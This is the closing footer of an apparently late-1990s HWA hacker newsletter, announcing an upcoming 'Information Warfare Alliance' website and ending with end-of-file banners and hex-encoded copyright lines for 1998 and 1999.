+     Hackerz Without Attitudez Information Warfare Alliance Website
+     Opening soon:
+                          www.hwa-iwa.org
+                         
+    
+     --EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--
+  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-
+   [ 28 63 29 20 31 39 39 39 20 63 72 75 63 69 70 68 75 78 20 68 77 61 ]
+       [45:6E:64]-[28:63:29:31:39:39:38:20:68:77:61:20:73:74:65:76:65]     
